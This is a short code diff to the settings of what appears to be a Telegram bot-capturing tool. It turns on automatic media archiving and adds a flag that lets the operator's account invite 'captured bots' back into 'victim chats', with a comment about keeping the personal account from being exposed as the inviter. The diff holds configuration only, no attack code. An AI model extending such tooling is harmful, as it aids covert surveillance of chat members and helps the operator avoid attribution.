@@ -72,7 +72,11 @@ class Settings(BaseSettings):
     MONITOR_GROUP_ID: int | str
     WHITELISTED_BOT_IDS: str = "" # Comma-separated IDs (or usernames)
     ANONYMOUS_ADMIN_ID: int = 1087968824  # Telegram anonymous group admin bot ID
-    AUTO_ARCHIVE_MEDIA: bool = False
+    AUTO_ARCHIVE_MEDIA: bool = True
+    # If True, the logged-in user-agent account may invite captured bots back
+    # into victim chats. Disabled by default to avoid exposing the personal
+    # account as the inviter.
+    AUTO_INVITE_CAPTURED_BOTS: bool = False
     MAX_ARCHIVE_SIZE_MB: int = 1024
     ARCHIVE_DOWNLOAD_TIMEOUT_SECONDS: int = 1800
     ARCHIVE_UPLOAD_TIMEOUT_SECONDS: int = 1800
